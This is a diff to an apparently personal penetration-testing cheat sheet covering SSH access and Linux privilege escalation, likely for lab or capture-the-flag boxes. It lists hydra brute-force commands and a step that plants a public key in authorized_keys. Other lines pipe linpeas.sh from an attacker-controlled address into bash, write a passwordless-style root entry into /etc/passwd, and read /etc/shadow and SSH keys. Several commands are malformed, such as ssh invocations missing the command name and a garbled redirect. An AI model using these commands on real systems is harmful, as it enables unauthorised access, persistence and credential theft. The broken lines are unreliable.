@@ -293,11 +293,15 @@ get file.txt -
 [*] (22) SSH
 hydra ssh://$TARGET -L usernames -P passwords -t35
 
-ssh-keygen -f sshkey -N ''; cat sshkey.pub
-echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINzZbkLBUl5mk0AW8lPkWRXrupSiydDr8GJauiEAu3Ze' > $TARGET ~/.ssh/authorized_keys
 ssh-add -D
-$USERNAME@$TARGET -i sshkey.pub
-nano id_rsa; chmod 600 id_rsa; $USERNAME@$TARGET -i id_rsa -o PubkeyAcceptedAlgorithms=ssh-rsa
+
+yes | ssh-keygen -t ed25519 -f key -N '' > /dev/null; cat key.pub
+ssh $USERNAME@$TARGET -i key.pub -L 33060:Localhost:33060 -L 5000:Localhost:5000
+-PubkeyAcceptedKeyTypes (ssh-rsa, ecdsa-sha2-nistp256, ecdsa-sha2-nistp384, ecdsa-sha2-nistp521, ssh-ed25519, ssh-dss)
+echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINzZbkLBUl5mk0AW8lPkWRXrupSiydDr8GJauiEAu3Ze' > $TARGET ~/.ssh/authorized_keys
+$USERNAME@$TARGET -i key.pub
+
+nano key; chmod 600 key; $USERNAME@$TARGET -i key -o PubkeyAcceptedAlgorithms=ssh-rsa
 
 [*] (23) Telnet
 hydra telnet://$TARGET  -L usernames -P passwords -t35
@@ -448,29 +452,28 @@ curl 192.168.214.128/linux/linpeas.sh | bash
 
 ## Linux
 [*] Privilege Escalation
+find / -perm /4000 2>/dev/null | xargs ls -la
+sudo -l
+netstat -tuln
+cat /etc/crontab
+ls -la /opt
+grep -r -E 'conf' /var/www
+cd ~/.ssh; ls -la
+
+ls -la /etc/passwd
 nano /etc/passwd
 mkpasswd -m descrypt 'password'
 root:Vg4sD8/6ZPqpk:0:0:root:/root:/usr/bin/bash
 su root
 password
 
-[*] Enumeration
 find / -name '*secret0*' -readable 2>/dev/null | xargs ls -la
 find / -name 'root.txt' -readable -exec echo {} \; -exec cat {} \; 2>/dev/null
 cat /etc/passwd | grep -vE 'nologin' | cut -d ':' -f '1'
-sudo -l
-find / -perm /4000 2>/dev/null
-cat /etc/crontab
-netstat -tuln
-ls -la /opt
-grep -r -E 'conf' /var/www
-cat ~/.ssh/id_rsa
+
 cat /etc/shadow
 curl $MYIP:8088/linpeas.sh | bash
 su $USERNAME --preserve-environment
-ssh $USERNAME@$TARGET -i sshkey.pub -L 33060:Localhost:33060 -L 5000:Localhost:5000
-
-
 
 [*] Upgrade TTY
 python3 -c 'import pty; pty.spawn("/bin/bash")';
